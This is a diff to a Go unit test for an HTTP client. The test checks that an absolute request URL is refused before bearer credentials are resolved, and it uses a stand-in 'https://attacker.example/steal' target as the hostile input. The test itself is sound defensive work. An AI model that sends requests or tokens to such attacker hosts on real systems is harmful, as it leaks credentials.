@@ -426,7 +426,7 @@ func TestAmbientOpenAIConfigurationIsNotInherited(t *testing.T) {
 	}
 }
 
-func TestRejectsCrossOriginBeforeBearerResolution(t *testing.T) {
+func TestRejectsAbsoluteReferenceBeforeBearerResolution(t *testing.T) {
 	var attempts, providerCalls, transportCalls int
 	client, err := NewClient(context.Background(), Config{
 		BaseURL: "https://bedrock.example/openai/v1",
@@ -449,10 +449,10 @@ func TestRejectsCrossOriginBeforeBearerResolution(t *testing.T) {
 	}
 	var response *http.Response
 	err = client.Get(context.Background(), "https://attacker.example/steal", nil, &response)
-	if err == nil || !strings.Contains(err.Error(), "origin other than") {
+	if err == nil || !strings.Contains(err.Error(), "request path must be a relative URL reference") {
 		t.Fatalf("error = %v", err)
 	}
-	if attempts != 1 || providerCalls != 0 || transportCalls != 0 {
+	if attempts != 0 || providerCalls != 0 || transportCalls != 0 {
 		t.Fatalf("attempts = %d, provider calls = %d, transport calls = %d", attempts, providerCalls, transportCalls)
 	}
 }
